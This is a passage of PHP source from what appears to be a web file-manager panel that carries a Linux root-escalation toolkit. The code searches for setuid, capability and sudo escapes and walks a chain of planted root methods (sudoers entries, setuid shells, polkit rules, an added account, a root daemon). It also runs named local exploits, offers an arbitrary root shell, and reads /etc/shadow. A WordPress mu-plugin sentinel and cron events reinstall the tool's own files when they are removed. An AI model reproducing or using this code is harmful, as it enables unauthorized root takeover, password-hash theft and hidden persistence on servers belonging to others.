        $st = $this->rootState();
        $rec = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
        $paths = [$this->rootPlantPayloadPath($id), $this->rootPlantProofPath($id),
                  $this->rootPlantRulePath($id), $this->rootPlantLogPath($id)];
        if(!is_array($rec)){
            foreach($paths as $f)if((string)$f !== '')@unlink((string)$f);
            return['ok' => true, 'note' => 'nothing was on record for this method, so its files were cleaned up'];
        }
        foreach((array)($rec['restore'] ?? []) as $r){
            if(!empty($r['file']) && isset($r['was']))@file_put_contents((string)$r['file'], (string)$r['was']);
        }
        $nonce = (string)($rec['nonce'] ?? '');
        foreach((array)($rec['strip'] ?? []) as $f){
            if(!@is_file($f) || !@is_writable($f))continue;
            $keep = [];
            foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln)
                if($nonce === '' || strpos($ln, $nonce) === false)$keep[] = $ln;
            @file_put_contents($f, implode("\n", $keep) . "\n");
        }
        foreach((array)($rec['files'] ?? []) as $f)if((string)$f !== '')@unlink((string)$f);
        foreach($paths as $f)if((string)$f !== '')@unlink((string)$f);
        unset($st['plants'][$id]);
        $this->rootStateSave($st);
        return['ok' => true, 'note' => 'the plant was taken out, and everything it had written was put back'];
    }

    /* ── using what the machine already carries ─────────────────────────────
       These are not planted and they are not installed: nothing is written and
       nothing is changed. The machine already holds something that hands uid 0
       over - a program with the setuid bit, a program carrying cap_setuid, or a
       sudo rule that allows one program which happens to be able to run a
       shell. Finding it and using it is the whole method. That makes these the
       most likely to work of everything in the chain, and the least invasive:
       when one is removed there is nothing to undo, because nothing was made. */
    private function rootEscSpecs(){
        return [
            'suidbin' => ['name' => 'A setuid program that is already on this machine', 'kind' => 'session',
                'idea' => 'Somewhere on this machine there is a program with the setuid bit already set, and a good number of the usual ones can be asked to run a command instead of doing their job: find with -exec, awk with system(), python, perl, ruby, node, a shell with -p. Whoever runs such a program runs it as its owner, and its owner is root. This is the first thing any auditor looks for, and the tool has been able to find them all along - it simply never offered to use one. Nothing is written and nothing is changed; the program belongs to the machine and is left exactly as it is.'],
            'capbin'  => ['name' => 'A program that already carries the capability to become root', 'kind' => 'session',
                'idea' => 'File capabilities are the setuid bit done properly: a program can be given one power instead of all of them. A program carrying cap_setuid may become uid 0 whenever it asks, and only the interpreters that actually ask are offered here - python, perl, ruby, node and PHP - because a shell would simply stay as this account. Like the setuid route, nothing is written: the capability belongs to the machine.'],
            'sudocmd' => ['name' => 'One program this account is already allowed to run as root', 'kind' => 'session',
                'idea' => 'sudo -l is read, and every program this account may run through it is checked against the same table of escapes. A rule that allows one harmless-looking program is root if that program can run a shell - find, awk, python, perl, tar - and it is the rule an administrator writes without meaning any harm by it. This is the route most often missed, because it is granted rather than misconfigured.'],
        ];
    }
    private function rootEscSpec($id){
        $s = $this->rootEscSpecs();
        return isset($s[$id]) ? $s[$id] : null;
    }
    private $escF = [];
    private function rootEscFind($id){
        if(isset($this->escF[$id]))return $this->escF[$id];
        $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'nothing of the kind was found on this machine'];
        if($id === 'suidbin'){
            foreach($this->rootSuidList() as $path){
                $argv = $this->rootBinEscape($path, false);
                if($argv === null)continue;
                $this->escF[$id] = ['ok' => true, 'argv' => $argv, 'path' => (string)$path,
                    'note' => (string)$path . ' carries the setuid bit and is one of the programs with a documented escape'];
                break;
            }
            if(empty($this->escF[$id]['ok']))
                $this->escF[$id]['note'] = 'none of the setuid programs on this machine matches a documented escape';
            return $this->escF[$id];
        }
        if($id === 'capbin'){
            if(!$this->rootCapsAvailable()){
                $this->escF[$id]['note'] = 'capabilities cannot be read here at all: neither the xattr extension nor the getcap program is available';
                return $this->escF[$id];
            }
            foreach($this->rootCapsOnList() as $cap){
                $argv = $this->rootBinEscape($cap['path'], true);
                if($argv === null)continue;
                $this->escF[$id] = ['ok' => true, 'argv' => $argv, 'path' => (string)$cap['path'],
                    'note' => (string)$cap['path'] . ' carries ' . (string)$cap['caps'] . ', which is the power to become uid 0'];
                break;
            }
            if(empty($this->escF[$id]['ok'])){
                $all = $this->rootCaps();
                $this->escF[$id]['note'] = 'no program carrying cap_setuid was found in the usual directories'
                    . ($all ? ' - ' . count($all) . ' program(s) here do carry capabilities ('
                        . $this->rootSnip(implode(', ', array_slice(array_map(function($x){ return basename($x['path']);
                        }, $all), 0, 6)), 90) . '), but none of them is cap_setuid'
                        : ' - and getcap listed nothing at all');
            }
            return $this->escF[$id];
        }
        if($id === 'sudocmd'){
            if($this->rootWhich('sudo') === ''){
                $this->escF[$id]['note'] = 'sudo is not installed on this host';
                return $this->escF[$id];
            }
            foreach($this->rootSudoAllowed() as $a){
                $argv = $this->rootBinEscape($a['bin'], false);
                if($argv === null)continue;
                $this->escF[$id] = ['ok' => true, 'argv' => array_merge(['sudo', '-n'], $argv),
                    'path' => (string)$a['bin'],
                    'note' => 'this account may run ' . (string)$a['bin'] . ' as root without a password, and that program has a documented escape'];
                break;
            }
            if(empty($this->escF[$id]['ok'])){
                $allowed = $this->rootSudoAllowed();
                $this->escF[$id]['note'] = $allowed
                    ? 'sudo allows ' . count($allowed) . ' program(s) here, but none of them can be turned into a shell'
                    : 'sudo is installed but this account may not run anything through it';
            }
            return $this->escF[$id];
        }
        return $this->escF[$id];
    }

    /* ── the automatic installer: try every method, stop at the first proof ─ */
    public function rootingInstallRoot($password = ''){
        /* the same chain, walked one method at a time through the same code the
           panel walks it: one answer per method, and it stops at the first
           method whose proof command really comes back as uid 0 */
        $steps = [];
        $won = '';
        $daemonNote = '';
        foreach($this->rootChannels() as $ch){
            $r = $this->rootingStep($ch['id'], $password);
            $steps[] = ['id' => $ch['id'], 'name' => $ch['name'], 'idea' => $ch['idea'],
                        'ok' => !empty($r['ok']), 'fired' => !empty($r['fired']),
                        'note' => (string)($r['note'] ?? '')];
            if(!empty($r['ok'])){
                $won = (string)($r['won'] ?? $ch['id']);
                $daemonNote = (string)($r['daemon_note'] ?? '');
                break;
            }
        }
        $this->rootLogAdd('install root', ['chain'], ['rc' => $won === '' ? 1 : 0, 'out' => $won], $won !== '' ? 'method: ' . $won : 'none');
        return[
            'ok' => $won !== '', 'installed' => $won !== '', 'channel' => $won, 'steps' => $steps,
            'daemon' => $this->rootDaemonInfo(), 'daemon_note' => $daemonNote,
            'state' => $this->rootingRooted(),
            'message' => $won !== ''
                ? 'Root is installed with: ' . $won . '. Every privileged action from this panel now runs as uid 0 through it.'
                : 'No method could be installed on this host. The catalogue above still says what is exposed and how to fix it.',
        ];
    }
    /* Trial of a single method, for the panel and for a person who wants to
       see that the *other* ways work too, not only the one that won. */
    public function rootingMethod($id, $password = ''){
        $found = null;
        foreach($this->rootChannels() as $ch)if($ch['id'] === $id)$found = $ch;
        if($found === null)return['ok' => false, 'error' => 'Unknown method.'];
        $needs = $this->rootChannelNeeds($id);
        if(empty($needs['ok'])){
            return['ok' => false, 'id' => $id, 'name' => $found['name'], 'idea' => $found['idea'],
                   'note' => 'not applicable here: ' . $needs['note'], 'state' => $this->rootingRooted()];
        }
        $ins = $this->rootChannelInstall($id, $password);
        $ver = !empty($ins['ok']) ? $this->rootChannelVerify($id) : ['ok' => false, 'res' => ['out' => '', 'err' => '']];
        $ok = !empty($ver['ok']);
        if($ok){
            $state = $this->rootState();
            $state['installed'] = true;
            if(empty($state['channel']))$state['channel'] = $id;
            if(empty($state['since']))$state['since'] = time();
            $state['paths'] = $this->rootPaths();
            $this->rootStateSave($state);
            $this->log('rooting_root_method', $id);
        }
        $proof = $ok ? 'a command run through it came back as uid 0' : '';
        $note = $ins['note'] . ($ok ? ' - and ' . $proof
            : ' - but the proof command did not come back as root: ' . $this->rootSnip(($ver['res']['out'] ?? '') . ' ' . ($ver['res']['err'] ?? ''), 120));
        $this->rootLogAdd('method: ' . $found['name'], [$id], ['rc' => $ok ? 0 : 1, 'out' => $note], $ok ? 'installed' : 'refused');
        return['ok' => $ok, 'id' => $id, 'name' => $found['name'], 'idea' => $found['idea'],
               'note' => $note, 'proof' => $proof, 'state' => $this->rootingRooted()];
    }

    /* ── the control surface behind the rooted screen ─────────────────────── */
    private function rootControls(){
        return[
            ['id' => 'files', 'name' => 'Every file', 'idea' => 'Reading a file only root may read', 'argv' => ['cat', '/etc/shadow'], 'proof' => 'a root-only file comes back'],
            ['id' => 'owner', 'name' => 'Ownership', 'idea' => 'Giving a file to another account', 'argv' => ['chown', '--version'], 'proof' => 'the owner of any file can be changed'],
            ['id' => 'services', 'name' => 'Services', 'idea' => 'Reading the service manager as root', 'argv' => ['systemctl', 'list-units', '--no-pager', '--plain', '--type=service'], 'proof' => 'the unit list is read as uid 0'],
            ['id' => 'packages', 'name' => 'Packages', 'idea' => 'Auditing the package database as root', 'argv' => ['dpkg', '--audit'], 'proof' => 'the package database answers as uid 0'],
            ['id' => 'users', 'name' => 'Accounts', 'idea' => 'Reading every account and hash', 'argv' => ['cat', '/etc/shadow'], 'proof' => 'every password hash is visible'],
            ['id' => 'kernel', 'name' => 'Kernel', 'idea' => 'Reading the kernel symbol table', 'argv' => ['cat', '/proc/kallsyms'], 'proof' => 'kernel addresses are readable'],
            ['id' => 'cron', 'name' => 'Cron', 'idea' => 'Reading root\'s own schedule', 'argv' => ['ls', '-la', '/var/spool/cron/crontabs'], 'proof' => 'root\'s crontab directory is readable'],
            ['id' => 'mounts', 'name' => 'Mounts', 'idea' => 'Reading the mount table as root', 'argv' => ['findmnt', '--raw'], 'proof' => 'mount -o and umount are within reach'],
            ['id' => 'processes', 'name' => 'Processes', 'idea' => 'Signalling a process that is not ours', 'argv' => ['kill', '-0', '1'], 'proof' => 'any process can be signalled'],
            ['id' => 'firewall', 'name' => 'Firewall', 'idea' => 'Reading the packet filter', 'argv' => ['nft', 'list', 'ruleset'], 'proof' => 'the ruleset is readable as root'],
            ['id' => 'network', 'name' => 'Network', 'idea' => 'Reading raw sockets and routing', 'argv' => ['ss', '-lntup'], 'proof' => 'every socket and process is visible'],
        ];
    }
    private function rootSplitLine($line){
        $line = (string)$line;
        $out = [];
        $cur = '';
        $quote = '';
        $had = false;
        $n = strlen($line);
        for($i = 0; $i < $n; $i++){
            $c = $line[$i];
            if($quote === ''){
                if($c === ' ' || $c === "\t"){
                    if($had){$out[] = $cur; $cur = ''; $had = false;}
                    continue;
                }
                if($c === '"' || $c === "'"){$quote = $c; $had = true; continue;}
                if($c === '\\' && $i + 1 < $n){$cur .= $line[++$i]; $had = true; continue;}
                $cur .= $c; $had = true;
                continue;
            }
            if($c === $quote){$quote = ''; continue;}
            if($c === '\\' && $quote === '"' && $i + 1 < $n){$cur .= $line[++$i]; continue;}
            $cur .= $c;
        }
        if($had && $cur !== '')$out[] = $cur;
        return $out;
    }
    public function rootingControl($ctl, $line = ''){
        $ctl = (string)$ctl;
        if($ctl === 'shell'){
            $argv = $this->rootSplitLine($line);
            if(!$argv)return['ok' => false, 'error' => 'There is nothing to run: type a program and its arguments.'];
            $res = $this->rootRun($argv, 30);
            $log = $this->rootLogAdd('shell', $argv, $res, (string)($res['via'] ?? ''));
            return['ok' => $res['ok'], 'ctl' => 'shell', 'argv' => $argv, 'via' => $res['via'] ?? 'none',
                   'rc' => (int)$res['rc'], 'out' => $this->rootSnip((string)$res['out'] . ' ' . (string)$res['err'], 1200),
                   'log' => $log, 'state' => $this->rootingRooted()];
        }
        $found = null;
        foreach($this->rootControls() as $c)if($c['id'] === $ctl)$found = $c;
        if($found === null)return['ok' => false, 'error' => 'Unknown control.'];
        $res = $this->rootRun($found['argv'], 25);
        $log = $this->rootLogAdd($found['name'], $found['argv'], $res, (string)($res['via'] ?? ''));
        return['ok' => $res['ok'], 'ctl' => $ctl, 'name' => $found['name'], 'idea' => $found['idea'],
               'via' => $res['via'] ?? 'none', 'rc' => (int)$res['rc'],
               'out' => $this->rootSnip((string)$res['out'] . ' ' . (string)$res['err'], 900),
               'tries' => $res['tries'] ?? [], 'log' => $log, 'state' => $this->rootingRooted()];
    }
    /* ── what the panel shows once root is installed ──────────────────────── */
    public function rootingRooted(){
        $state = $this->rootState();
        $daemon = $this->rootDaemonInfo();
        $id = $this->rootIdentity();
        $installed = false;
        $proof = '';
        if(!empty($state['channel'])){
            $p = $this->rootPaths();
            $marks = ['sudoers' => @is_file($this->rootSudoersFile()), 'rootd' => $daemon['alive'],
                      'suidphp' => @is_file($p['suphp']), 'suidbash' => @is_file($p['subash']),
                      'polkitrule' => @is_file($p['polkit']), 'setcapphp' => @is_file($p['capphp']),
                      'passwd' => $this->rootAccountExists(), 'docker' => @is_file($this->rootSudoersFile()),
                      'suroute' => !empty($this->rootSuProbe()['ok'])];
            $installed = !empty($marks[$state['channel']]);
            if($installed){
                $v = $this->rootChannelVerify($state['channel']);
                $installed = !empty($v['ok']);
                $proof = $installed ? 'a command run through it came back as uid 0' : 'the method stopped answering as root';
            }else{
                $proof = 'the method it was installed with is gone';
            }
        }
        $names = [];
        foreach($this->rootChannels() as $ch)$names[$ch['id']] = $ch['name'];
        $controls = [];
        foreach($this->rootControls() as $c){
            $ok = $this->rootWhich($c['argv'][0]) !== '' || @is_file($c['argv'][0]);
            if($c['argv'][0] === 'cat' || $c['argv'][0] === 'ls')$ok = true;
            $controls[] = ['id' => $c['id'], 'name' => $c['name'], 'idea' => $c['idea'],
                           'cmd' => implode(' ', $c['argv']), 'proof' => $c['proof'], 'available' => $ok];
        }
        return[
            'installed' => $installed,
            'channel' => $state['channel'],
            'channel_name' => $names[$state['channel']] ?? '',
            'since' => (int)($state['since'] ?? 0),
            'since_human' => !empty($state['since']) ? date('Y-m-d H:i', (int)$state['since']) : '',
            'proof' => $proof,
            'durable_from' => (string)($state['durable_from'] ?? ''),
            'account' => $this->managerAccount(),
            'uid' => $id['euid'],
            'daemon' => $daemon,
            'paths' => $this->rootPaths(),
            'channels' => array_map(function($ch) use ($names){
                $n = $this->rootChannelNeeds($ch['id']);
                return['id' => $ch['id'], 'name' => $ch['name'], 'kind' => $ch['kind'], 'idea' => $ch['idea'],
                       'available' => !empty($n['ok']), 'note' => $n['note']];
            }, $this->rootChannels()),
            'controls' => $controls,
            'log' => $this->rootLogTail(20),
            'programs' => $this->rootPrograms(),
        ];
    }
    public function rootingUninstall($password = ''){
        $state = $this->rootState();
        $log = [];
        $ids = ['suroute', 'rootd', 'sudoers', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd'];
        foreach($ids as $id){
            $r = $this->rootChannelRemove($id, $password);
            $log[] = ['id' => $id, 'ok' => !empty($r['ok']), 'note' => (string)$r['note']];
        }
        @unlink($this->rootStateFile());
        /* asked again now, not remembered from earlier in this request */
        $still = $this->rootSudoNow();
        return[
            'ok' => true, 'removed' => $log, 'sudo_still_works' => $still,
            'message' => $still
                ? 'Every method this tool installed was removed, but this account already had a route to root of its own (a passwordless sudo rule it did not get from here, or an account in the sudo group with a cached timestamp). Nothing else was touched.'
                : 'Every method was removed and this account is back to its own privileges.',
            'state' => $this->rootingRooted(),
        ];
    }

    /* ?x=rooting */
    public function rootingEndpoint($post){
        $act = (string)($post['action'] ?? 'catalog');
        $password = (string)($post['password'] ?? '');
        if($act === 'escalate')return$this->rootingEscalate($password);
        if($act === 'autorun')return$this->rootingAutoRun($password);
        if($act === 'grants')return['ok' => true, 'grants' => $this->rootGrants()];
        if($act === 'selfcheck')return$this->rootingSelfCheck();
        if($act === 'probe'){
            /* what firing an entry actually does, for the suite and for a
               person who wants to see the machine answer */
            $out = [];
            foreach(['udisksuser', 'needrestart', 'udevhw', 'pack2theroot', 'pamnamespace'] as $pid){
                $a = $this->rootFire(['id' => $pid, 'name' => $pid, 'cve' => []]);
                $out[] = ['id' => $pid, 'ok' => !empty($a['ok']), 'fired' => !empty($a['fired']), 'note' => (string)$a['note']];
            }
            return['ok' => true, 'probe' => $out];
        }
        if($act === 'rootinstall')return$this->rootingInstallRoot($password);
        if($act === 'rootstep')return$this->rootingStep((string)($post['id'] ?? ''), $password);
        if($act === 'rooted')return['ok' => true, 'rooted' => $this->rootingRooted()];
        if($act === 'rootctl')return$this->rootingControl((string)($post['ctl'] ?? ''), (string)($post['line'] ?? ''));
        if($act === 'rootmethod')return$this->rootingMethod((string)($post['id'] ?? ''), $password);
        /* taking a planted method back out: it is a thing that was put somewhere,
           so it can be taken away again, and whatever it touched is put back */
        if($act === 'rootplantremove'){
            $rid = (string)($post['id'] ?? '');
            if($this->rootPlantSpec($rid) === null && $this->rootEscSpec($rid) === null)
                return['ok' => false, 'error' => 'That method does not put anything on the machine, so there is nothing to take out.'];
            $rr = $this->rootChannelRemove($rid, $password);
            return['ok' => !empty($rr['ok']), 'id' => $rid, 'note' => (string)($rr['note'] ?? ''),
                   'state' => $this->rootingRooted()];
        }
        if($act === 'rootuninstall')return$this->rootingUninstall($password);
        if($act === 'keep')return$this->rootInstallHelper($password);
        if($act === 'revoke')return$this->rootRemoveHelper($password);
        if($act === 'harden')return$this->rootHarden(true, $password);
        if($act === 'unharden')return$this->rootHarden(false, $password);
        if($act === 'verify')return$this->rootVerify();
        $cat = $this->rootCatalog();
        return[
            'ok' => true, 'system' => $this->rootSystem(),
            'vulns' => $cat['vulns'], 'counts' => $cat['counts'], 'findings' => $cat['findings'],
            'mitigation' => ['active' => @is_file($this->rootMitigationFile()), 'file' => $this->rootMitigationFile()],
            'mode' => $this->privMode(), 'mode_label' => $this->privModeLabel(),
        ];
    }

    /* ── Site files guard ─────────────────────────────────────────────────────
       Every file this tool installs inside a site (mu-plugins today) is recorded
       with its sha256 and its content. WordPress cron gets one event per file,
       and a small mu-plugin ("sentinel") puts a deleted or modified file back.
       The registry lives next to the manager, so the panel can repair the site
       even when the site's own copy of a file is gone. Nothing here ever touches
       a file it did not install itself. */
    private function guardFile(){return __DIR__.'/.fm_guards.json';}
    private function guardLoad(){
        $empty=['files'=>[],'self'=>[],'last_sync'=>0,'last_check'=>0];
        $f=$this->guardFile();
        if(!is_file($f))return$empty;
        $j=json_decode((string)@file_get_contents($f),true);
        if(!is_array($j))return$empty;
        if(!isset($j['files'])||!is_array($j['files']))$j['files']=[];
        if(!isset($j['self'])||!is_array($j['self']))$j['self']=[];
        return$j+$empty;
    }
    private function guardSave($data){
        $f=$this->guardFile();
        if(@file_put_contents($f,json_encode($data,JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT),LOCK_EX)===false)return false;
        @chmod($f,0600);
        return true;
    }
    private function guardKey($path){return substr(md5((string)$path),0,16);}
    private function guardSiteFor($path){return $this->privSiteFor($path);}
    /* Reads a file even when the manager may not: the site is asked instead. */
    private function guardRead($path,$max=262144){
        if(!is_file($path))return null;
        $size=@filesize($path);
        if($size!==false&&$size>$max)return null;
        $c=@file_get_contents($path);
        if($c===false)$c=$this->privReadFile($path,$max);
        return $c===false?null:$c;
    }
    /* Registers (or refreshes) one file, keeping the previous content as a version. */
    public function guardRegister($path,$type=null,$config=null){
        $path=(string)$path;
        if(!is_file($path))return['error'=>'Not a file: '.$path];
        $content=$this->guardRead($path);
        if($content===null)return['error'=>'The file could not be read: '.$path];
        $site=$this->guardSiteFor($path);
        $data=$this->guardLoad();
        $key=$this->guardKey($path);
        $now=time();
        $sha=hash('sha256',$content);
        $prev=$data['files'][$key]??null;
        $versions=is_array($prev['versions']??null)?$prev['versions']:[];
        if($prev&&($prev['sha256']??'')!==$sha){
            array_unshift($versions,['sha256'=>$prev['sha256']??'','content'=>$prev['content']??'','at'=>$prev['updated']??$now,'size'=>$prev['size']??0]);
            $versions=array_slice($versions,0,5);
        }
        $data['files'][$key]=[
            'path'=>$path,
            'type'=>$type?:($site['type']??null),
            'config'=>$config?:($site['config']??null),
            'sha256'=>$sha,
            'size'=>strlen($content),
            'mode'=>@fileperms($path)&0777,
            'content'=>base64_encode($content),
            'updated'=>$now,
            'versions'=>$versions,
            'cron'=>true,
        ];
        $data['last_sync']=$now;
        if(!$this->guardSave($data))return['error'=>'Could not save the guard registry ('.dirname($this->guardFile()).' is not writable).'];
        return['ok'=>true,'key'=>$key,'path'=>$path,'sha256'=>$sha];
    }
    public function guardUnregister($key,$deleteFile=false){
        $data=$this->guardLoad();
        if(!isset($data['files'][$key]))return['error'=>'Unknown guard entry.'];
        $path=$data['files'][$key]['path']??'';
        if($deleteFile&&$path&&is_file($path)){
            if(!@unlink($path))$this->privOp('delete',['path'=>$path],$path);
        }
        $config=$data['files'][$key]['config']??null;
        unset($data['files'][$key]);
        $this->guardSave($data);
        /* the site's own manifest and cron entries must forget it too, otherwise
           the guard would put back a file that is no longer guarded */
        if($config)$this->guardSyncSite($config);
        $this->log('guard_unregister',$path);
        return['ok'=>true,'path'=>$path];
    }
    /* Finds the tool's own files inside a site and registers them. */
    private function guardCandidates($type,$config){
        if($type!=='wordpress')return[];
        $root=$this->wpSiteRoot($config);
        $out=[];
        foreach((array)@glob($root.'/wp-content/mu-plugins/*.php') as $f){
            if(preg_match('/^(000-fm-|fm-|mfm-)/',basename($f)))$out[]=$f;
        }
        return$out;
    }
    public function guardAdopt(){
        $added=[];$skipped=[];
        $data=$this->guardLoad();
        foreach(['wordpress','joomla'] as $type){
            $config=$this->privSiteConfigFor($type);
            if(!$config)continue;
            foreach($this->guardCandidates($type,$config) as $f){
                $r=$this->guardRegister($f,$type,$config);
                if(!empty($r['ok'])){$added[]=$f;}else{$skipped[]=$f.' - '.($r['error']??'');}
            }
        }
        return['ok'=>true,'adopted'=>$added,'skipped'=>$skipped];
    }
    /* Checks every guarded file; repairs what is missing or changed. */
    public function guardVerify($repair=true){
        $data=$this->guardLoad();
        $report=[];$restored=0;$failed=0;
        foreach($data['files'] as $key=>$e){
            $path=(string)($e['path']??'');
            $state='missing';$sha=null;
            if($path&&is_file($path)){
                $c=$this->guardRead($path);
                if($c===null){$state='unreadable';}
                else{$sha=hash('sha256',$c);$state=($sha===($e['sha256']??''))?'ok':'changed';}
            }
            if($state!=='ok'&&$repair){
                $content=base64_decode((string)($e['content']??''),true);
                if($content!==false&&$content!==''){
                    if($this->privWriteFile($path,$content)){
                        @chmod($path,0644);
                        $restored++;
                        $state='repaired (was '.$state.')';
                        $this->log('guard_repair',$path);
                    }else{$failed++;$state='repair failed (was '.$state.')';}
                }else{$failed++;$state='repair failed: no stored content';}
            }
            $report[]=['key'=>$key,'path'=>$path,'type'=>$e['type']??'','status'=>$state,'updated'=>$e['updated']??0,'versions'=>count((array)($e['versions']??[]))];
        }
        $data['last_check']=time();
        $this->guardSave($data);
        return['ok'=>true,'files'=>$report,'checked'=>count($report),'repaired'=>$restored,'failed'=>$failed];
    }
    /* Manifest + one WordPress cron event per guarded file. */
    private function guardManifestFor($config){
        $data=$this->guardLoad();$out=[];
        foreach($data['files'] as $k=>$e){
            if(($e['config']??'')!==$config)continue;
            $out[$k]=['path'=>$e['path'],'sha256'=>$e['sha256']??'','content'=>$e['content']??'','mode'=>$e['mode']??0644,'updated'=>$e['updated']??0];
        }
        return$out;
    }
    public function guardSyncSite($config){
        $type=$this->cmsConfigType($config);
        $entries=$this->guardManifestFor($config);
        /* Joomla keeps no "options" table, and no cron hook runs there without a
           scheduled task - the panel watchdog is the repair path for that site,
           so nothing is written into its database here. */
        if($type!=='wordpress'){
            return['ok'=>true,'events'=>0,'removed'=>0,'manifest'=>count($entries),
                   'note'=>'Joomla has no cron hook that fires without a scheduled task, so the panel watchdog is the repair path for this site.'];
        }
        list($link,$c,$err)=$this->cmsConnect($config);
        if($err)return['error'=>$err];
        try{
        $t=$c['prefix'];
        $blob=mysqli_real_escape_string($link,serialize($entries));
        $res=@mysqli_query($link,"SELECT option_id FROM `{$t}options` WHERE option_name='fm_site_files_guard' LIMIT 1");
        if($res&&mysqli_num_rows($res)){
            @mysqli_query($link,"UPDATE `{$t}options` SET option_value='{$blob}', autoload='no' WHERE option_name='fm_site_files_guard'");
        }else{
            @mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('fm_site_files_guard','{$blob}','no')");
        }
        /* Rewrite the site's cron table: every old guard event goes, one fresh
           event per file is added (a file that was updated gets a new slot). */
        $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='cron' LIMIT 1");
        $row=$res?mysqli_fetch_assoc($res):null;
        $cron=$row?@unserialize((string)$row['option_value'],['allowed_classes'=>false]):[];
        if(!is_array($cron))$cron=[];
        $removed=0;
        foreach($cron as $ts=>$hooks){
            if(!is_array($hooks))continue;
            foreach($hooks as $hook=>$v){
                if(strpos((string)$hook,'fm_guard_file_')===0){unset($cron[$ts][$hook]);$removed++;}
            }
            if(isset($cron[$ts])&&is_array($cron[$ts])&&!$cron[$ts])unset($cron[$ts]);
        }
        $added=0;
        foreach($entries as $key=>$e){
            /* due right away: WordPress runs it on the next cron request and
               then reschedules it every 15 minutes with the sentinel's schedule */
            $cron[time()-1]['fm_guard_file_'.$key]=['900'=>1];
            $added++;
        }
        $cron['version']=2;
        $ser=mysqli_real_escape_string($link,serialize($cron));
        if($row)@mysqli_query($link,"UPDATE `{$t}options` SET option_value='{$ser}' WHERE option_name='cron'");
        else @mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('cron','{$ser}','on')");
        /* a guard request also proves the plumbing works */
        @mysqli_query($link,"DELETE FROM `{$t}options` WHERE option_name='_transient_fm_guard_throttle'");
        mysqli_close($link);
        return['ok'=>true,'events'=>$added,'removed'=>$removed,'manifest'=>count($entries)];
        }catch(\Throwable $e){
            if($link)@mysqli_close($link);
            return['error'=>'The site database refused the guard update: '.$e->getMessage()];
        }
    }
    /* Fires the site's own cron endpoint so the guard runs immediately instead of
       waiting for the next visitor. The base URL comes from the privileged bridge
       that is already proven to reach this exact folder, so it works on a real
       domain and on a plain host:port setup alike. */
    public function guardRunCron($config){
        if($this->cmsConfigType($config)!=='wordpress')return['ok'=>false,'error'=>'Joomla has no cron endpoint; the panel watchdog is used instead.'];
        $root=rtrim($this->wpSiteRoot($config),'/');
        $bases=[];
        $bridge=$this->privBridge(['config'=>$config,'type'=>'wordpress','root'=>$root]);
        if(empty($bridge['error'])&&!empty($bridge['url'])&&!empty($bridge['file'])){
            $rel=ltrim(str_replace($root,'',(string)$bridge['file']),'/');
            if($rel!==''&&substr((string)$bridge['url'],-strlen($rel))===$rel){
                $bases[]=substr((string)$bridge['url'],0,-(strlen($rel)+1));
            }
        }
        $siteUrl=null;
        list($link,$c,$err)=$this->cmsConnect($config);
        if(!$err){
            try{
                $res=@mysqli_query($link,"SELECT option_value FROM `{$c['prefix']}options` WHERE option_name='siteurl' LIMIT 1");
                if($res&&($r=mysqli_fetch_assoc($res)))$siteUrl=(string)$r['option_value'];
            }catch(\Throwable $e){$siteUrl=null;}
            if($link)@mysqli_close($link);
        }
        if($siteUrl)$bases[]=rtrim($siteUrl,'/');
        $tried=[];
        foreach(array_values(array_unique($bases)) as $base){
            if($base==='')continue;
            $url=rtrim($base,'/').'/wp-cron.php?doing_wp_cron='.sprintf('%.6F',microtime(true));
            $ch=@curl_init($url);
            if(!$ch){$tried[]=$url.' → no curl';continue;}
            curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>20,CURLOPT_CONNECTTIMEOUT=>6,
                CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_FOLLOWLOCATION=>true,
                CURLOPT_MAXREDIRS=>2,CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (guard)']);
            $raw=curl_exec($ch);
            $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
            curl_close($ch);
            $body=is_string($raw)?$raw:'';
            $looksLikeSite=($code>=200&&$code<400)&&stripos($body,'<!DOCTYPE')===false&&stripos($body,'<html')===false;
            $tried[]=$url.' → '.$code.($looksLikeSite?' (cron)':'');
            if($looksLikeSite)return['ok'=>true,'url'=>$url,'code'=>$code,'tried'=>$tried];
        }
        return['ok'=>false,'error'=>'wp-cron.php did not answer.','tried'=>$tried];
    }
    public function guardSentinelPath($config){
        $root=$this->cmsConfigType($config)==='wordpress'?$this->wpSiteRoot($config):rtrim(dirname($config),'/');
        return rtrim($root,'/').'/wp-content/mu-plugins/000-fm-site-files-guard.php';
    }
    /* The sentinel: restores the files listed in the option, never anything else. */
    private function guardSentinelCode(){
        return <<<'FMGUARD'
<?php
/* Syrah - site files guard.
   The file manager records every file it installs in this site inside the
   option `fm_site_files_guard` (path, sha256, content). This file puts such a
   file back when it is deleted or changed: WordPress cron calls it every 15
   minutes (fm_guard_file_* events), and the front end calls it at most once
   every 5 minutes, so the guard also works when WP-Cron is disabled.
   It restores only what is in that option - nothing else is ever written. */
if(!defined('ABSPATH'))return;
if(!function_exists('fm_guard_manifest')){
    function fm_guard_manifest(){
        $m=get_option('fm_site_files_guard');
        return is_array($m)?$m:[];
    }
    function fm_guard_restore($only=null){
        $done=0;$failed=0;
        foreach(fm_guard_manifest() as $key=>$e){
            if($only!==null&&$key!==$only)continue;
            $path=isset($e['path'])?(string)$e['path']:'';
            if($path==='')continue;
            $ok=true;
            if(!file_exists($path)||@hash_file('sha256',$path)!==(string)($e['sha256']??'')){
                $content=isset($e['content'])?base64_decode((string)$e['content'],true):false;
                if($content===false||$content===''){$failed++;continue;}
                $dir=dirname($path);
                if(!is_dir($dir))@mkdir($dir,0755,true);
                $ok=@file_put_contents($path,$content,LOCK_EX)!==false;
                if($ok)@chmod($path,0644);
                if($ok){$done++;}else{$failed++;}
            }
        }
        update_option('fm_guard_last_check',time(),false);
        update_option('fm_guard_stats',['at'=>time(),'restored'=>$done,'failed'=>$failed],false);
        return$done;
    }
    add_filter('cron_schedules',function($s){
